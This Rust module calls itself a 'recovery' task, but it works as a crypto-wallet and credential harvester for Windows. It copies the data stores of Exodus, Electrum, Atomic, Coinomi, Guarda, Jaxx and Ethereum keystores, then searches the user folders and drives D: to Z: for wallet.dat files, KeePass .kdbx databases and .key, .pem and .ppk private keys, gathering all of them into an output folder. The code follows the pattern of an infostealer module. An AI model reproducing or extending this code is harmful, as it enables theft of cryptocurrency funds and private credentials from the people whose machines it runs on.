use crate::recovery::{
    context::RecoveryContext,
    fs::{copy_dir_limited, sanitize_label},
    task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask},
};
use async_trait::async_trait;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use tokio::fs;
use walkdir::WalkDir;

pub fn wallet_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
    vec![
        Arc::new(CryptoWalletTask::new(ctx)),
        Arc::new(WalletPatternSearchTask::new(ctx)),
    ]
}

struct CryptoWalletTask {
    specs: Vec<WalletSpec>,
}

impl CryptoWalletTask {
    fn new(ctx: &RecoveryContext) -> Self {
        Self {
            specs: build_wallet_specs(ctx),
        }
    }
}

#[async_trait]
impl RecoveryTask for CryptoWalletTask {
    fn label(&self) -> String {
        "Crypto Wallet Data".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Wallets
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        for spec in &self.specs {
            let dest_root = wallet_output_dir(ctx, spec.label).await?;
            for dir in &spec.directories {
                copy_wallet_directory(&spec.label, dir, &dest_root, &mut artifacts).await?;
            }
            for file in &spec.files {
                copy_wallet_file(&spec.label, file, &dest_root, &mut artifacts).await?;
            }
        }

        Ok(artifacts)
    }
}

struct WalletSpec {
    label: &'static str,
    directories: Vec<PathBuf>,
    files: Vec<PathBuf>,
}

impl WalletSpec {
    fn new(label: &'static str) -> Self {
        Self {
            label,
            directories: Vec::new(),
            files: Vec::new(),
        }
    }

    fn dir(mut self, path: PathBuf) -> Self {
        self.directories.push(path);
        self
    }

    fn file(mut self, path: PathBuf) -> Self {
        self.files.push(path);
        self
    }
}

fn build_wallet_specs(ctx: &RecoveryContext) -> Vec<WalletSpec> {
    let roaming = &ctx.roaming_data_dir;
    let mut specs = Vec::new();

    specs.push(WalletSpec::new("Ethereum Keystore").dir(roaming.join("Ethereum").join("keystore")));
    specs.push(WalletSpec::new("Electrum Wallets").dir(roaming.join("Electrum").join("wallets")));

    specs.push(
        WalletSpec::new("Atomic LevelDB")
            .dir(roaming.join("atomic").join("Local Storage").join("leveldb")),
    );
    specs.push(WalletSpec::new("Exodus").file(roaming.join("Exodus").join("exodus.wallet")));
    specs.push(
        WalletSpec::new("Jaxx LevelDB").dir(
            roaming
                .join("com.liberty.jaxx")
                .join("IndexedDB")
                .join("file__0.indexeddb.leveldb"),
        ),
    );

    specs.push(
        WalletSpec::new("Coinomi").dir(roaming.join("Coinomi").join("Coinomi").join("wallets")),
    );
    specs.push(
        WalletSpec::new("Guarda LevelDB")
            .dir(roaming.join("Guarda").join("Local Storage").join("leveldb")),
    );
    specs.push(WalletSpec::new("Zephyr").dir(roaming.join("Zephyr").join("wallets")));

    specs
}

struct WalletPatternSearchTask {
    user_roots: Vec<PathBuf>,
    drive_roots: Vec<PathBuf>,
}

impl WalletPatternSearchTask {
    fn new(ctx: &RecoveryContext) -> Self {
        let mut user_roots = vec![
            ctx.home_dir.join("Desktop"),
            ctx.home_dir.join("Documents"),
            ctx.home_dir.join("Downloads"),
            ctx.local_data_dir.clone(),
            ctx.roaming_data_dir.clone(),
        ];
        user_roots.retain(|p| p.exists());

        let mut drive_roots = Vec::new();
        for b in b'D'..=b'Z' {
            let drive = format!("{}:\\", b as char);
            let path = PathBuf::from(&drive);
            if path.exists() {
                drive_roots.push(path);
            }
        }

        Self {
            user_roots,
            drive_roots,
        }
    }
}

const TARGET_PATTERNS: &[&str] = &[
    "wallet.dat",
    "default_wallet",
    "UTC--",
    ".kdbx",
    ".key",
    ".pem",
    ".ppk",
];

const IGNORED_DIRS: &[&str] = &[
    "Windows",
    "Program Files",
    "Program Files (x86)",
    "ProgramData",
    "$Recycle.Bin",
    "System Volume Information",
    "OneDriveTemp",
    "node_modules",
    ".git",
    "target",
];

#[async_trait]
impl RecoveryTask for WalletPatternSearchTask {
    fn label(&self) -> String {
        "Wallet Discovery".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Wallets
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        let dest_root = wallet_output_dir(ctx, "Discovery").await?;
        let mut handles = Vec::new();

        for root in &self.user_roots {
            let root = root.clone();
            handles.push(tokio::task::spawn_blocking(move || {
                perform_scan(root, 5)
            }));
        }

        for root in &self.drive_roots {
            let root = root.clone();
            handles.push(tokio::task::spawn_blocking(move || {
                perform_scan(root, 3)
            }));
        }

        for handle in handles {
            if let Ok(files) = handle.await {
                for file in files {
                    let _ = copy_wallet_file("Discovery", &file, &dest_root, &mut artifacts).await;
                }
            }
        }

        Ok(artifacts)
    }
}

fn perform_scan(root: PathBuf, depth: usize) -> Vec<PathBuf> {
    let mut found = Vec::new();
    let walker = WalkDir::new(root)
        .max_depth(depth)
        .follow_links(false)
        .into_iter()
        .filter_entry(|e| !is_ignored(e));

    for entry in walker.filter_map(Result::ok) {
        if !entry.file_type().is_file() {
            continue;
        }
        let name = entry.file_name().to_string_lossy();
        if TARGET_PATTERNS.iter().any(|&p| name.contains(p)) {
            found.push(entry.path().to_path_buf());
        }
    }
    found
}

fn is_ignored(entry: &walkdir::DirEntry) -> bool {
    entry
        .file_name()
        .to_str()
        .map(|s| IGNORED_DIRS.contains(&s))
        .unwrap_or(false)
}


async fn wallet_output_dir(ctx: &RecoveryContext, label: &str) -> Result<PathBuf, RecoveryError> {
    let folder = ctx
        .output_dir
        .join("services")
        .join("Wallets")
        .join(sanitize_label(label));
    fs::create_dir_all(&folder).await?;
    Ok(folder)
}

async fn copy_wallet_directory(
    label: &str,
    src: &Path,
    dst: &Path,
    artifacts: &mut Vec<RecoveryArtifact>,
) -> Result<(), RecoveryError> {
    match fs::metadata(src).await {
        Ok(metadata) if metadata.is_dir() => {
            copy_dir_limited(src, dst, label, artifacts, usize::MAX, 0).await?;
        }
        _ => {}
    }
    Ok(())
}

async fn copy_wallet_file(
    label: &str,
    file: &Path,
    dst_root: &Path,
    artifacts: &mut Vec<RecoveryArtifact>,
) -> Result<(), RecoveryError> {
    if !file.exists() {
        return Ok(());
    }

    fs::create_dir_all(dst_root).await?;
    let dest = dst_root.join(
        file.file_name()
            .unwrap_or_else(|| std::ffi::OsStr::new("file")),
    );
    fs::copy(file, &dest).await?;
    let meta = fs::metadata(&dest).await?;
    artifacts.push(RecoveryArtifact {
        label: label.to_string(),
        path: dest,
        size_bytes: meta.len(),
        modified: meta.modified().ok(),
    });
    Ok(())
}
